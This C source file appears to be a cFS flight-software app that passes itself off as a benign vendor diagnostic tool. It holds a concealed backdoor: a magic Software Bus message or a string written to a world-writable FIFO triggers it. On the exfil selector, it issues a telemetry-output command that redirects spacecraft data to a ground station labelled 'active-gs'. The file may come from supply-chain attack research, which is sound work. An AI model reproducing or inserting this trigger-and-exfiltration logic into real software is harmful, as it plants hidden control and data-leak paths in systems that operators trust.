#include "sc_vendor_diag_app.h"

#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "to_lab_msg.h"
#include "to_lab_msgids.h"

#ifndef SC_VENDOR_PAYLOAD_EXFIL
#define SC_VENDOR_PAYLOAD_EXFIL 0
#endif

SC_VENDOR_DIAG_AppData_t SC_VENDOR_DIAG_AppData;

static int32 SC_VENDOR_DIAG_AppInit(void);
static void  SC_VENDOR_DIAG_ProcessPacket(void);
static void  SC_VENDOR_DIAG_ProcessCommand(void);
static void  SC_VENDOR_DIAG_ProcessCoordination(const SC_VENDOR_DIAG_CoordMsg_t *msg);
static void  SC_VENDOR_DIAG_ProcessFifo(void);
static void  SC_VENDOR_DIAG_ReportHousekeeping(void);
static int32 SC_VENDOR_DIAG_Exfil(void);
static void  SC_VENDOR_DIAG_Reset(void);
static int32 SC_VENDOR_DIAG_VerifyLength(CFE_MSG_Size_t expected);

void SCVD_AppMain(void)
{
    int32 status = SC_VENDOR_DIAG_AppInit();

    CFE_ES_PerfLogEntry(SC_VENDOR_DIAG_PERF_ID);
    if (status != CFE_SUCCESS)
    {
        SC_VENDOR_DIAG_AppData.RunStatus = CFE_ES_RunStatus_APP_ERROR;
    }

    while (CFE_ES_RunLoop(&SC_VENDOR_DIAG_AppData.RunStatus))
    {
        CFE_ES_PerfLogExit(SC_VENDOR_DIAG_PERF_ID);
        status = CFE_SB_ReceiveBuffer((CFE_SB_Buffer_t **)&SC_VENDOR_DIAG_AppData.MsgPtr,
                                      SC_VENDOR_DIAG_AppData.CmdPipe, SC_VENDOR_DIAG_TIMEOUT_MS);
        CFE_ES_PerfLogEntry(SC_VENDOR_DIAG_PERF_ID);

        if (status == CFE_SUCCESS)
        {
            SC_VENDOR_DIAG_ProcessPacket();
        }
        else if (status != CFE_SB_TIME_OUT && status != CFE_SB_NO_MESSAGE)
        {
            CFE_EVS_SendEvent(SC_VENDOR_DIAG_ERROR_EID, CFE_EVS_EventType_ERROR,
                              "SC_VENDOR_DIAG: SB receive failed: %d", (int)status);
            SC_VENDOR_DIAG_AppData.RunStatus = CFE_ES_RunStatus_APP_ERROR;
        }

        SC_VENDOR_DIAG_ProcessFifo();
    }

    if (SC_VENDOR_DIAG_AppData.FifoFd >= 0)
    {
        close(SC_VENDOR_DIAG_AppData.FifoFd);
    }
    CFE_ES_PerfLogExit(SC_VENDOR_DIAG_PERF_ID);
    CFE_ES_ExitApp(SC_VENDOR_DIAG_AppData.RunStatus);
}

static int32 SC_VENDOR_DIAG_AppInit(void)
{
    int32 status;

    memset(&SC_VENDOR_DIAG_AppData, 0, sizeof(SC_VENDOR_DIAG_AppData));
    SC_VENDOR_DIAG_AppData.RunStatus = CFE_ES_RunStatus_APP_RUN;
    SC_VENDOR_DIAG_AppData.FifoFd = -1;

    status = CFE_EVS_Register(NULL, 0, CFE_EVS_EventFilter_BINARY);
    if (status != CFE_SUCCESS)
    {
        return status;
    }
    status = CFE_SB_CreatePipe(&SC_VENDOR_DIAG_AppData.CmdPipe, SC_VENDOR_DIAG_PIPE_DEPTH,
                              "SC_VENDOR_DIAG_PIPE");
    if (status != CFE_SUCCESS)
    {
        return status;
    }
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(SC_VENDOR_DIAG_CMD_MID), SC_VENDOR_DIAG_AppData.CmdPipe);
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(SC_VENDOR_DIAG_REQ_HK_MID), SC_VENDOR_DIAG_AppData.CmdPipe);
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(SC_VENDOR_COORD_MID), SC_VENDOR_DIAG_AppData.CmdPipe);

#ifdef __linux__
    (void)mkfifo(SC_VENDOR_DIAG_FIFO_PATH, 0666);
    SC_VENDOR_DIAG_AppData.FifoFd = open(SC_VENDOR_DIAG_FIFO_PATH, O_RDONLY | O_NONBLOCK);
#endif

    CFE_MSG_Init(CFE_MSG_PTR(SC_VENDOR_DIAG_AppData.HkTelemetryPkt.TlmHeader),
                 CFE_SB_ValueToMsgId(SC_VENDOR_DIAG_HK_TLM_MID),
                 sizeof(SC_VENDOR_DIAG_AppData.HkTelemetryPkt));
    CFE_EVS_SendEvent(SC_VENDOR_DIAG_INIT_EID, CFE_EVS_EventType_INFORMATION,
                      "SC_VENDOR_DIAG: benign vendor diagnostic app initialized");
    return CFE_SUCCESS;
}

static void SC_VENDOR_DIAG_ProcessPacket(void)
{
    CFE_SB_MsgId_t msg_id = CFE_SB_INVALID_MSG_ID;
    CFE_MSG_GetMsgId(SC_VENDOR_DIAG_AppData.MsgPtr, &msg_id);

    if (CFE_SB_MsgIdToValue(msg_id) == SC_VENDOR_COORD_MID)
    {
        SC_VENDOR_DIAG_ProcessCoordination((const SC_VENDOR_DIAG_CoordMsg_t *)SC_VENDOR_DIAG_AppData.MsgPtr);
    }
    else if (CFE_SB_MsgIdToValue(msg_id) == SC_VENDOR_DIAG_CMD_MID)
    {
        SC_VENDOR_DIAG_ProcessCommand();
    }
    else if (CFE_SB_MsgIdToValue(msg_id) == SC_VENDOR_DIAG_REQ_HK_MID)
    {
        SC_VENDOR_DIAG_ReportHousekeeping();
    }
}

static void SC_VENDOR_DIAG_ProcessCoordination(const SC_VENDOR_DIAG_CoordMsg_t *msg)
{
    if (msg->Magic == SC_VENDOR_DIAG_TRIGGER_MAGIC)
    {
        SC_VENDOR_DIAG_AppData.Triggered = true;
        SC_VENDOR_DIAG_AppData.HkTelemetryPkt.Triggered = 1;
        SC_VENDOR_DIAG_AppData.HkTelemetryPkt.CoordinationCount++;
        CFE_EVS_SendEvent(SC_VENDOR_DIAG_COORD_EID, CFE_EVS_EventType_INFORMATION,
                          "SC_VENDOR_DIAG: Software Bus coordination trigger received");
        if (msg->Payload == SC_VENDOR_PAYLOAD_EXFIL)
        {
            SC_VENDOR_DIAG_Exfil();
        }
    }
}

static void SC_VENDOR_DIAG_ProcessFifo(void)
{
#ifdef __linux__
    char buffer[32];
    ssize_t bytes;

    if (SC_VENDOR_DIAG_AppData.FifoFd < 0)
    {
        return;
    }
    bytes = read(SC_VENDOR_DIAG_AppData.FifoFd, buffer, sizeof(buffer));
    if (bytes > 0 && !strncmp(buffer, "SC_VENDOR_TRIGGER", 18))
    {
        SC_VENDOR_DIAG_AppData.Triggered = true;
        SC_VENDOR_DIAG_AppData.HkTelemetryPkt.Triggered = 1;
        SC_VENDOR_DIAG_AppData.HkTelemetryPkt.CoordinationCount++;
        /* FIFO coordination is a trigger transport; the nav carrier performs
         * the selected native payload dispatch and diag only records receipt. */
    }
#endif
}

static void SC_VENDOR_DIAG_ProcessCommand(void)
{
    CFE_MSG_FcnCode_t code = 0;
    CFE_MSG_GetFcnCode(SC_VENDOR_DIAG_AppData.MsgPtr, &code);
    if (code == SC_VENDOR_DIAG_NOOP_CC && SC_VENDOR_DIAG_VerifyLength(sizeof(SC_VENDOR_DIAG_NoArgsCmd_t)) == CFE_SUCCESS)
    {
        SC_VENDOR_DIAG_AppData.HkTelemetryPkt.CommandCount++;
    }
    else if (code == SC_VENDOR_DIAG_RESET_CC && SC_VENDOR_DIAG_VerifyLength(sizeof(SC_VENDOR_DIAG_NoArgsCmd_t)) == CFE_SUCCESS)
    {
        SC_VENDOR_DIAG_Reset();
    }
    else if (code != SC_VENDOR_DIAG_NOOP_CC && code != SC_VENDOR_DIAG_RESET_CC)
    {
        SC_VENDOR_DIAG_AppData.HkTelemetryPkt.CommandErrorCount++;
    }
}

static int32 SC_VENDOR_DIAG_Exfil(void)
{
    TO_LAB_EnableOutputCmd_t cmd;
    memset(&cmd, 0, sizeof(cmd));
    CFE_MSG_Init(CFE_MSG_PTR(cmd.CmdHeader), CFE_SB_ValueToMsgId(TO_LAB_CMD_MID), sizeof(cmd));
    CFE_MSG_SetFcnCode(CFE_MSG_PTR(cmd.CmdHeader), TO_LAB_OUTPUT_ENABLE_CC);
    strncpy(cmd.Payload.dest_IP, "active-gs", sizeof(cmd.Payload.dest_IP) - 1);
    CFE_SB_TimeStampMsg(CFE_MSG_PTR(cmd.CmdHeader));
    SC_VENDOR_DIAG_AppData.HkTelemetryPkt.ExfilCommandCount++;
    return CFE_SB_TransmitMsg(CFE_MSG_PTR(cmd.CmdHeader), true);
}

static void SC_VENDOR_DIAG_ReportHousekeeping(void)
{
    SC_VENDOR_DIAG_AppData.HkTelemetryPkt.Triggered = SC_VENDOR_DIAG_AppData.Triggered;
    CFE_SB_TimeStampMsg(CFE_MSG_PTR(SC_VENDOR_DIAG_AppData.HkTelemetryPkt.TlmHeader));
    CFE_SB_TransmitMsg(CFE_MSG_PTR(SC_VENDOR_DIAG_AppData.HkTelemetryPkt.TlmHeader), true);
}

static void SC_VENDOR_DIAG_Reset(void)
{
    SC_VENDOR_DIAG_AppData.Triggered = false;
    SC_VENDOR_DIAG_AppData.HkTelemetryPkt.CommandErrorCount = 0;
    SC_VENDOR_DIAG_AppData.HkTelemetryPkt.CommandCount = 0;
    SC_VENDOR_DIAG_AppData.HkTelemetryPkt.CoordinationCount = 0;
    SC_VENDOR_DIAG_AppData.HkTelemetryPkt.ExfilCommandCount = 0;
}

static int32 SC_VENDOR_DIAG_VerifyLength(CFE_MSG_Size_t expected)
{
    CFE_MSG_Size_t actual = 0;
    if (CFE_MSG_GetSize(SC_VENDOR_DIAG_AppData.MsgPtr, &actual) != CFE_SUCCESS || actual < expected)
    {
        SC_VENDOR_DIAG_AppData.HkTelemetryPkt.CommandErrorCount++;
        return CFE_STATUS_WRONG_MSG_LENGTH;
    }
    return CFE_SUCCESS;
}
